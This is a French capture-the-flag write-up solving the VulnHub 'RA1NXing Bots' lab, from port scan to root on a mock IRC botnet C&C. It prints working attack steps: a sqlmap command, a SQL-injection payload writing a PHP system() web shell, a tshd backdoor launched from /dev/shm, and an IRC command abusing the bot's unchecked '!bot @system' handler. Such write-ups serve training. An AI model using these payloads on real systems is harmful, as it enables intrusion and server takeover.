# Solution du CTF RA1NXing Bots

Anti-bot Consortium
-------------------

Le CTF [RA1NXing Bots](http://vulnhub.com/entry/bot-challenges-ra1nxing-bots,52/) est le premier d'une série de CTF autours des botnets disponible sur *VulnHub*.  

L'objectif est d'exploiter une vulnérabilitée dans le bot et de prendre par exemple le contrôle du C&C.  

Ici c'est un peu particulier car dans la vraie vie on partirait sans doute d'un bot trouvé sur une machine infectée pour remonter jusqu'au C&C alors que là on va partir du C&C pour ensuite accèder au bot.  

Smells like bot spirit
----------------------

On ne trouve seulement quelques ports ouverts sur cette Debian 6 virtualisée :  

```plain
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
| ssh-hostkey:
|   1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
|_  2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
| http-title: Site doesn't have a title (text/html).
|_Requested resource was /index.php?page=main
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|_  100000  2,3,4        111/udp  rpcbind
6667/tcp open  irc     IRCnet ircd
| irc-info: 
|   server: irc.localhost
|   version: 2.11.2p2. irc.localhost 000A 
|   servers: 1
|   chans: 16
|   users: 2
|   lservers: 0
|   lusers: 2
|   uptime: 0 days, 0:01:28
|   source host: 192.168.1.3
|_  source ident: NONE or BLOCKED
```

Sur le port 6667 on trouve un serveur IRC (ircd-irc2) avec l'invite suivante :  

```plain
* There are 2 users and 0 services on 1 servers
* 16 :channels formed
* I have 2 users, 0 services and 0 servers
* 2 2 :Current local users 2, max 2
* 2 2 :Current global users 2, max 2
* - irc.localhost Message of the Day - 
* - 6/7/2013 17:35
* - This is the "loser crew" botnet C2.
* - We are super 31337 and will p@wn anyone snooping around!
* - WE WILL DDoS YOU OFF THE PLANET!  DON'T MAKE FUN OF OUR MASKS!
* End of MOTD command.
```

Sur le port 80 se trouve un site web minimaliste avec un script index.php qui prend un paramètre *page*.  

Il contient un formulaire de connexion (username et password) que j'attaque avec SQLmap :  

```bash
python sqlmap.py -u http://192.168.1.53/index.php?page=login --data="user=test&password=test" -p user --dbms=mysql --current-user
```

J'obtiens en vrac les informations suivantes (en changeant le dernier paramètre) :  

```plain
web server operating system: Linux Debian 6.0 (squeeze)
web application technology: PHP 5.3.3, Apache 2.2.16
back-end DBMS: MySQL >= 5.0.0
[19:07:45] [INFO] fetching current user
[19:07:45] [INFO] retrieved: root@localhost
current user:    'root@localhost'
current database:    'user_db'

debian-sys-maint:*1DA3475E6E4482C9931E9FE23FF02A543E375E08
root:*0AC55189DF8ACE402E133C48FB045DC09E81B516
root:*1DA3475E6E4482C9931E9FE23FF02A543E375E08

Database: user_db
Table: users
[1 entry]
+------------------------------+--------+
| pass                         | user   |
+------------------------------+--------+
| totally not helpful password | root   |
+------------------------------+--------+
```

Avec *--file-read=/var/www/index.php* je récupère le contenu du index.php :  

```php
<?php
if(!isset($_GET['page']))
{
        header("Location: /index.php?page=main");
        exit();
}
?>
<html>
<head>
</head>
<body>
<a href="/index.php?page=main">Main</a><br/>
<a href="/index.php?page=login">Login</a><br/>
<a href="/index.php?page=contact.php">Contact Us</a><br/>
<?php
$page = basename($_GET['page']);
print(file_get_contents($page));
?>
<?php
if(isset($_POST['user']) && isset($_POST['password']))
{
        $user = $_POST['user'];
        $pass = $_POST['password'];

        $link = mysql_connect("localhost", "root", "some bad pass");
        mysql_select_db("user_db");
        $query = "SELECT * FROM users WHERE user='".$user."' AND pass='$pass'";
        $result = mysql_query($query) or die(mysql_error());
        if(mysql_num_rows($result) === 1)
        {
                print("YOU LOGGED IN!<br/>");
        }
        mysql_close($link);
```

J'aurais pu le récupérer grace au *file\_get\_contents* sans passer par la base de données ;-)  

L'exploitation est ici très limitée en raison du basename().  

Comment améliorer notre accès ? Les options *--os-shell* et *--os-cmd* de sqlmap n'aboutissent pas.  

J'ai essayé de trouver des fichiers accessibles en lecture qui auraient pu me donner une autre piste mais sans succès.  

Je suis donc revenu sur le SQL et en exploitant un *INTO OUTFILE* ça a fonctionné... Comme quoi il ne faut jamais faire trop confiance aux outils qu'on utilise.  

Pour cela j'ai simplement saisi comme nom d'utilisateur :  

```plain
' union select '<?php system($_GET["cmd"]); ?>', '' into outfile '/var/www/bd.php'#
```

En explorant les dossiers via la backdoor j'ai remarqué que sqlmap créait bien des fichiers mais ces derniers étaient vides...  

Je tente d'uploader un tshd dans le dossier courant (/var/www) et de lui donner des droits d'exécution mais l'opération ne passe pas, le changement de permission ne semble pas pris en compte sans pour autant lever d'erreur :(  

Idem pour /tmp. La commande mount n'a rien révélé de particulier... qu'importe /dev/shm m'a sauvé une fois de plus :)  

Le chat' bot-é
--------------

```plain
mabox:~$ ./tsh 192.168.1.53
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux IRCC2 2.6.32-5-686 #1 SMP Fri May 10 08:33:48 UTC 2013 i686 GNU/Linux
```

Dans les processus je remarque cette ligne :  

```plain
root      1537  0.0  1.2  28748  6360 ?        S    May29   0:00 php /root/decoded.php
```

Bien sûr le fichier est inaccessible (ce serait trop facile). Heureusement on trouve la version d'origine dans la racine web (*/var/www/botsources/botcode.php.txt*).  

Le script commence par définir différentes variables :  

```php
$servers   = "127.0.0.1";
$ports     = "6667";
$admins    = "";
$channels  = "#somechannel";
$realnames = "jhl";
$nicknames = "jhl1,jhl2,jhl3,jhl4,(...snip...),jhl27,jhl28,jhl29,jhl30";
$chanpass  = "trolol";
```

puis il se connecte au serveur IRC local et lance un parseur pour chaque ligne reçue :  

```php
parser($text);
```

Cette ligne est ensuite découpée en morceaux :  

```php
$sline      = $line;
$line         = explode(" ",$line);
$iduser     = explode("@",$line[0]);
$huser      = explode("!",$iduser[0]);
$user        = substr($huser[0],1,strlen($huser[0]));
$userId     = $huser[1];
$userHost = $iduser[1];
$typeMsg = $line[1];
$dropMsg = ($line[2]==$nick)?$user:$line[2];
$called     = (substr($line[3],1,strlen($line[3]))=="!cmd")?true:((substr($line[3],1,strlen($line[3]))==$nick)?true:false);
$pubcalled  = (substr($line[3],1,strlen($line[3]))=="!bot")?true:false;
$cmd        = (substr($line[4],0,1)=="@")?substr($line[4],1,strlen($line[4])):'shell';
$pubcmd   = (substr($line[4],0,1)=="@")?substr($line[4],1,strlen($line[4])):false;
if($line[5]){
    for($i=5;$i<count($line);$i++){
	$arg   .= $line[$i].(($i<(count($line)-1))?" ":"");
    }
}
```

Ainsi si un bot baptisé *abcd* reçoit le message suivant de la part d'un utilisateur *root* :  

```plain
:root!~root@192.168.1.3 PRIVMSG abcd :!cmd @system 'id'
```

Il aura les variables suivantes :  

```php
$user = root
$dropMsg = root
$called = true
$pubcalled = false
$cmd = system
$arg = 'id'
```

et pour ce message :  

```plain
:root!~root@192.168.1.3 PRIVMSG abcd :!bot @system 'id'
```

celles-çi :  

```php
$user = root
$dropMsg = root
$called = false
$pubcalled = true
$cmd = system
$arg = 'id'
```

Il semble que les commandes préfixées par *!cmd* soint destinées aux administrateurs uniquement (appel d'une fonction admin() pour vérifier) :  

```php
if($called){
    if($cmd=="shell") { $arg = $line[4]." ".$arg; }
    $cmd = ($cmd=="join")?"joins":$cmd;
    if ($typeMsg=="PRIVMSG" && admin($user) && $called && $cmd) {
	if(function_exists($cmd)){
	    $sender = "PRIVMSG ".$dropMsg." "._;
	    $GLOBALS['sender'] = $sender;
	    $arg = str_replace("\r","",$arg);
	    $arg = str_replace("\n","",$arg);
	    $cmd($arg);
	}
    }
}
```

alors que celles préfixées de *!bot* sont considérées publiques :  

```php
if($pubcalled){
    if ($typeMsg=="PRIVMSG" && $user && $pubcalled && $pubcmd) {
	if(function_exists($pubcmd)){
	    $sender = "PRIVMSG ".$dropMsg." "._;
	    $GLOBALS['sender'] = $sender;
	    $arg = str_replace("\r","",$arg);
	    $arg = str_replace("\n","",$arg);
	    $pubcmd($arg);
	}
    }
}
```

Je tente de rejoindre le cannal *#somechannel* avec */join #somechannel trolol* mais la clé ne passe pas, elle a du être modifiée dans la version qui tourne sur le système.  

En me basant [sur la liste des commandes IRC](http://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands) j'ai tenté de récupérer le nom du bot (qui est pris au hazard dans la liste *jhl1*... *jhl30*) mais obtenir un listing semble impossible en raison de la clé.  

L'astuce a été de tenter d'envoyer un message pour chaque l'utilisateur (heureusement il n'y en a que 30) avec par exemple :  

```plain
/privmsg jhl8 test
```

Ce qui donne pour un utilisateur inexistant (selon votre client IRC) :  

```plain
[13:20] [Erreur] jhl8 : aucun pseudo / canal de ce type.
```

Pour l'utilisateur *jhl27* je n'ai obtenu aucune erreur ce qui était plutôt bon signe.  

Après avoir moi-même lancé le bot pour vérifier la faille d'exécution j'ai choisi de créer le script *replace.sh* suivant dans */dev/shm* qui kill() mon tshd en cours puis le relancera cette fois avec les droits root :  

```bash
#!/bin/bash
killall tshd
/dev/shm/tshd&
```

J'ai procédé de la sorte car j'ai remarqué que le bot digère mal les arguments (exemple avec *uname -a*) :  

```plain
sh: uname -a : commande introuvable
```

Il ne me restait qu'à faire lancer mon script par le bot :  

```plain
/msg jhl27 !bot @system '/dev/shm/replace.sh'
```

J'ai vu ma connexion tsh se fermer et à la reconnection : bingo ! un C&C pwned :)  


*Published May 30 2014 at 18:50*